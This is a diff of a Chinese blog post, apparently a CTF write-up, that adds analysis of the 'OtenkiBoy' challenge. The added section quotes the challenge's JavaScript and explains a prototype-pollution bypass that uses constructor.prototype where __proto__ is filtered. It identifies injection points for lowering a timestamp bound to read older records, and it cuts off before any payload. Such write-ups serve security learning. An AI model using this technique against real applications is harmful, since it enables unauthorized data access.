@@ -365,7 +365,12 @@
         <li><a href="#时间盲注">时间盲注！</a></li>
       </ol>
     </li>
-    <li><a href="#otenkiboy">OtenkiBoy</a></li>
+    <li><a href="#otenkiboy">OtenkiBoy</a>
+      <ol>
+        <li><a href="#opts-注入点"><strong>opts 注入点</strong></a></li>
+        <li><a href="#时间函数注入点"><strong>时间函数注入点</strong></a></li>
+      </ol>
+    </li>
   </ol>
 
   <ol>
@@ -462,7 +467,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 30 分钟
+                    阅读时长: 37 分钟
                 </time>
             </div>
         
@@ -3535,7 +3540,469 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>minTimestamp 取自配置文件，在 Math.max 处为可控的 timestamp 设置下限值，我们需要将minTimestamp 改小来获取更早的数据库数据。</p>
-<h1 id="week5">week5
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nsert2db(mergeJSON(DEFAULT, data));  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里与上题不同，我们先追踪<code>mergeJSON</code>发现，没错，是打污染链，就是过滤了<code>__proto__</code>,那就用<code>constructor.prototype</code>代替（至于为什么看此文：<a class="link" href="https://blog.csdn.net/cc18868876837/article/details/81211729"  target="_blank" rel="noopener"
+    >帮你彻底搞懂JS中的prototype、__proto__与constructor（图解）_js prototype constructor-CSDN博客</a>直接看那个图就理解了）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">mergeJSON</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">target</span><span class="p">,</span> <span class="nx">patch</span><span class="p">,</span> <span class="nx">deep</span> <span class="o">=</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">patch</span> <span class="o">!==</span> <span class="s2">&#34;object&#34;</span><span class="p">)</span> <span class="k">return</span> <span class="nx">patch</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nb">Array</span><span class="p">.</span><span class="nx">isArray</span><span class="p">(</span><span class="nx">patch</span><span class="p">))</span> <span class="k">return</span> <span class="nx">patch</span><span class="p">;</span> <span class="c1">// do not recurse into arrays
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">target</span><span class="p">)</span> <span class="nx">target</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">deep</span><span class="p">)</span> <span class="p">{</span> <span class="nx">target</span> <span class="o">=</span> <span class="nx">copyJSON</span><span class="p">(</span><span class="nx">target</span><span class="p">),</span> <span class="nx">patch</span> <span class="o">=</span> <span class="nx">copyJSON</span><span class="p">(</span><span class="nx">patch</span><span class="p">);</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">key</span> <span class="k">in</span> <span class="nx">patch</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">key</span> <span class="o">===</span> <span class="s2">&#34;__proto__&#34;</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">target</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">!==</span> <span class="nx">patch</span><span class="p">[</span><span class="nx">key</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">target</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">mergeJSON</span><span class="p">(</span><span class="nx">target</span><span class="p">[</span><span class="nx">key</span><span class="p">],</span> <span class="nx">patch</span><span class="p">[</span><span class="nx">key</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">target</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>好，现在回头看注入点</p>
+<h3 id="opts-注入点"><strong>opts 注入点</strong>
+</h3><p>minTimestamp与createDate有关，追踪一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"> <span class="nx">minTimestamp</span> <span class="o">=</span> <span class="nx">createDate</span><span class="p">(</span><span class="nx">CONFIG</span><span class="p">.</span><span class="nx">min_public_time</span><span class="p">).</span><span class="nx">getTime</span><span class="p">();</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">createDate</span> <span class="o">=</span> <span class="p">(</span><span class="nx">str</span><span class="p">,</span> <span class="nx">opts</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">CopiedDefaultOptions</span> <span class="o">=</span> <span class="nx">copyJSON</span><span class="p">(</span><span class="nx">DEFAULT_CREATE_DATE_OPTIONS</span><span class="p">)</span> <span class="c1">// 深拷贝默认选项，防止修改原始默认值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">opts</span> <span class="o">===</span> <span class="s2">&#34;undefined&#34;</span><span class="p">)</span> <span class="nx">opts</span> <span class="o">=</span> <span class="nx">CopiedDefaultOptions</span> <span class="c1">// 如果未提供选项，则使用默认选项
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">opts</span> <span class="o">!==</span> <span class="s2">&#34;object&#34;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">        <span class="nx">opts</span> <span class="o">=</span> <span class="p">{</span> <span class="p">...</span><span class="nx">CopiedDefaultOptions</span><span class="p">,</span> <span class="nx">UTC</span><span class="o">:</span> <span class="nb">Boolean</span><span class="p">(</span><span class="nx">opts</span><span class="p">)</span> <span class="p">};</span> <span class="c1">// 如果opts不是对象，则将其视为布尔值并创建新选项对象
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
+</span></span><span class="line"><span class="cl">    <span class="nx">opts</span><span class="p">.</span><span class="nx">UTC</span> <span class="o">=</span> <span class="k">typeof</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">UTC</span> <span class="o">===</span> <span class="s2">&#34;undefined&#34;</span> <span class="o">?</span> <span class="nx">CopiedDefaultOptions</span><span class="p">.</span><span class="nx">UTC</span> <span class="o">:</span> <span class="nb">Boolean</span><span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">UTC</span><span class="p">);</span> <span class="c1">// 设置UTC选项，默认为false
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="nx">opts</span><span class="p">.</span><span class="nx">format</span> <span class="o">=</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">format</span> <span class="o">||</span> <span class="nx">CopiedDefaultOptions</span><span class="p">.</span><span class="nx">format</span><span class="p">;</span> <span class="c1">// 设置格式选项，如果未提供则使用默认格式
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">Array</span><span class="p">.</span><span class="nx">isArray</span><span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">format</span><span class="p">))</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">format</span> <span class="o">=</span> <span class="p">[</span><span class="nx">opts</span><span class="p">.</span><span class="nx">format</span><span class="p">]</span> <span class="c1">// 确保格式是数组形式
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="nx">opts</span><span class="p">.</span><span class="nx">format</span> <span class="o">=</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">format</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">f</span> <span class="p">=&gt;</span> <span class="k">typeof</span> <span class="nx">f</span> <span class="o">===</span> <span class="s2">&#34;string&#34;</span><span class="p">)</span> <span class="c1">// 过滤掉非字符串格式
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">f</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">// 检查格式字符串是否包含至少一个日期/时间格式说明符
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">if</span> <span class="p">(</span><span class="sr">/yy|yyyy|MM|dd|HH|mm|ss|fff/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">f</span><span class="p">)</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">console</span><span class="p">.</span><span class="nx">warn</span><span class="p">(</span><span class="sb">`Invalid format &#34;</span><span class="si">${</span><span class="nx">f</span><span class="si">}</span><span class="sb">&#34;.`</span><span class="p">,</span> <span class="sb">`At least one format specifier is required.`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="c1">// 检查格式说明符之间是否有分隔符
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">if</span> <span class="p">(</span><span class="sb">`|</span><span class="si">${</span><span class="nx">f</span><span class="si">}</span><span class="sb">|`</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/yyyy/g</span><span class="p">,</span> <span class="s2">&#34;yy&#34;</span><span class="p">).</span><span class="nx">split</span><span class="p">(</span><span class="sr">/yy|MM|dd|HH|mm|ss|fff/</span><span class="p">).</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">console</span><span class="p">.</span><span class="nx">warn</span><span class="p">(</span><span class="sb">`Invalid format &#34;</span><span class="si">${</span><span class="nx">f</span><span class="si">}</span><span class="sb">&#34;.`</span><span class="p">,</span> <span class="sb">`Delimiters are required between format specifiers.`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="c1">// 检查是否同时使用了yyyy和yy格式说明符
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">if</span> <span class="p">(</span><span class="nx">f</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;yyyy&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">f</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/yyyy/g</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">).</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;yy&#34;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">console</span><span class="p">.</span><span class="nx">warn</span><span class="p">(</span><span class="sb">`Invalid format &#34;</span><span class="si">${</span><span class="nx">f</span><span class="si">}</span><span class="sb">&#34;.`</span><span class="p">,</span> <span class="sb">`&#34;yyyy&#34; and &#34;yy&#34; cannot be used together.`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">})</span> <span class="c1">// 过滤并验证格式字符串的有效性
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
+</span></span><span class="line"><span class="cl">    <span class="nx">opts</span><span class="p">.</span><span class="nx">baseDate</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">baseDate</span> <span class="o">||</span> <span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">());</span> <span class="c1">// 设置基准日期，默认为当前日期，确保始终是一个有效的Date对象
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们知道在 JavaScript 中，当你访问一个对象的属性时，如果这个属性在对象本身上不存在，JavaScript 将会在原型链中查找该属性</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">当createDate的opts未指定时并不能注入，但是当opts为 JSON 对象且没有指定format属性时，下面这一行会触发原型链
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">opts.format = opts.format || CopiedDefaultOptions.format;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">而对于baseDate，由于DEFAULT_CREATE_DATE_OPTIONS中本身不含baseDate，可直接触发该原型链
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">opts.baseDate = new Date(opts.baseDate || Date.now());
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="时间函数注入点"><strong>时间函数注入点</strong>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">getHMS</span> <span class="o">=</span> <span class="p">(</span><span class="nx">time</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 定义正则表达式，用于匹配时间字符串，格式为：小时:分钟(:秒(.毫秒))?
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="nx">regres</span> <span class="o">=</span> <span class="sr">/^(\d+) *\: *(\d+)( *\: *(\d+)( *\. *(\d+))?)?$/</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">trim</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 如果正则匹配失败，返回空对象
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">regres</span> <span class="o">===</span> <span class="kc">null</span><span class="p">)</span> <span class="k">return</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// 提取匹配的各部分时间值，并转换为数字，未匹配的部分设置为undefined
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="p">[</span><span class="nx">n1</span><span class="p">,</span> <span class="nx">n2</span><span class="p">,</span> <span class="nx">n3</span><span class="p">,</span> <span class="nx">n4</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="nx">regres</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nx">regres</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nx">regres</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="nx">regres</span><span class="p">[</span><span class="mi">6</span><span class="p">]].</span><span class="nx">map</span><span class="p">(</span><span class="nx">t</span> <span class="p">=&gt;</span> <span class="k">typeof</span> <span class="nx">t</span> <span class="o">===</span> <span class="s2">&#34;undefined&#34;</span> <span class="o">?</span> <span class="kc">undefined</span> <span class="o">:</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">t</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// 如果秒部分未定义，则默认为0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">n3</span> <span class="o">===</span> <span class="s2">&#34;undefined&#34;</span><span class="p">)</span> <span class="nx">n3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// 验证时间各部分的值是否在有效范围内
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="mi">0</span> <span class="o">&lt;=</span> <span class="nx">n1</span> <span class="o">&amp;&amp;</span> <span class="nx">n1</span> <span class="o">&lt;=</span> <span class="mi">23</span> <span class="o">&amp;&amp;</span> <span class="mi">0</span> <span class="o">&lt;=</span> <span class="nx">n2</span> <span class="o">&amp;&amp;</span> <span class="nx">n2</span> <span class="o">&lt;=</span> <span class="mi">59</span> <span class="o">&amp;&amp;</span> <span class="mi">0</span> <span class="o">&lt;=</span> <span class="nx">n3</span> <span class="o">&amp;&amp;</span> <span class="nx">n3</span> <span class="o">&lt;=</span> <span class="mi">59</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 使用pad函数格式化时间各部分为两位数字字符串
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kd">let</span> <span class="nx">HH</span> <span class="o">=</span> <span class="nx">pad</span><span class="p">(</span><span class="nx">n1</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="nx">mm</span> <span class="o">=</span> <span class="nx">pad</span><span class="p">(</span><span class="nx">n2</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="nx">ss</span> <span class="o">=</span> <span class="nx">pad</span><span class="p">(</span><span class="nx">n3</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">// 处理毫秒部分，如果存在则格式化为三位数字字符串，否则为undefined
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">fff</span> <span class="o">=</span> <span class="k">typeof</span> <span class="nx">n4</span> <span class="o">===</span> <span class="s2">&#34;undefined&#34;</span> <span class="o">?</span> <span class="kc">undefined</span> <span class="o">:</span> <span class="nx">pad</span><span class="p">(</span><span class="nx">n4</span><span class="p">,</span> <span class="mi">3</span><span class="p">).</span><span class="nx">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// 构造返回对象，包含时、分、秒
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kr">const</span> <span class="nx">o</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">HH</span><span class="p">,</span> <span class="nx">mm</span><span class="p">,</span> <span class="nx">ss</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// 如果存在毫秒部分，则添加到返回对象中
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">fff</span> <span class="o">!==</span> <span class="s2">&#34;undefined&#34;</span><span class="p">)</span> <span class="nx">o</span><span class="p">.</span><span class="nx">fff</span> <span class="o">=</span> <span class="nx">fff</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// 返回包含格式化后时间的对象
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="nx">o</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 如果时间值无效，返回空对象
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>当传入的<code>time</code>中不包含毫秒时，返回的对象中不会带有<code>fff</code>属性，跟踪（转到引用）发现</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"> <span class="k">const</span> <span class="p">{</span> <span class="n">HH</span><span class="p">,</span> <span class="n">mm</span><span class="p">,</span> <span class="n">ss</span><span class="p">,</span> <span class="n">fff</span> <span class="p">}</span> <span class="o">=</span> <span class="n">getHMS</span><span class="p">(</span><span class="n">time_str</span><span class="p">)</span>			<span class="c1">#当time_str中不包含毫秒，能够触发原型链</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>接下来解决漏洞</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="err">我们发现</span><span class="o">`</span><span class="n">createDate</span><span class="o">`</span><span class="err">的</span><span class="o">`</span><span class="n">opts</span><span class="o">`</span><span class="err">的</span><span class="o">`</span><span class="n">format</span><span class="o">`</span><span class="err">支持</span><span class="o">`</span><span class="n">yy</span><span class="o">`</span><span class="err">标识符，而当年份小于</span><span class="mi">100</span><span class="err">时，我们认为是</span><span class="mi">20</span><span class="err">世纪的年份</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">举例来说，如果</span><span class="o">`</span><span class="n">format</span><span class="o">`</span><span class="err">为</span><span class="o">`</span><span class="mi">20</span><span class="n">yy</span><span class="o">-</span><span class="n">MM</span><span class="o">-</span><span class="n">dd</span><span class="o">`</span><span class="err">，在</span><span class="o">`</span><span class="n">format</span><span class="o">`</span><span class="err">解析字符串</span><span class="o">`</span><span class="mi">2023</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">01</span><span class="o">`</span><span class="err">时，将解析</span><span class="o">`</span><span class="n">yy</span><span class="o">`</span><span class="err">为</span><span class="o">`</span><span class="mi">23</span><span class="o">`</span><span class="err">，输出输出为</span><span class="o">`</span><span class="mi">1923</span><span class="o">`</span><span class="err">，最终输出的年份是</span><span class="o">`</span><span class="mi">1923</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">01</span><span class="o">`</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="err">#</span><span class="nx">也就是这个代码</span>
+</span></span><span class="line"><span class="cl"><span class="nx">sortTable</span><span class="p">.</span><span class="nx">forEach</span><span class="p">((</span><span class="nx">f</span><span class="p">,</span> <span class="nx">i</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="nx">f</span> <span class="o">==</span> <span class="s2">&#34;yy&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="kd">let</span> <span class="nx">year</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">regres</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">                        <span class="nx">year</span> <span class="o">=</span> <span class="nx">year</span> <span class="o">&lt;</span> <span class="mi">100</span> <span class="o">?</span> <span class="p">(</span><span class="mi">1900</span> <span class="o">+</span> <span class="nx">year</span><span class="p">)</span> <span class="o">:</span> <span class="nx">year</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">return</span> <span class="nx">argTable</span><span class="p">[</span><span class="s2">&#34;yyyy&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">year</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>接下来就是要污染format，前面提到，污染<code>format</code>的条件是<code>opts</code>为 JSON 对象且没有指定<code>format</code>属性，观察<code>routes/info</code>中的相应片段，我们需要触发下面的<code>catch</code>（使用 DEFAULT_CONFIG.min_public_time 重新计算 minTimestamp）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="k">try</span> <span class="p">{</span>
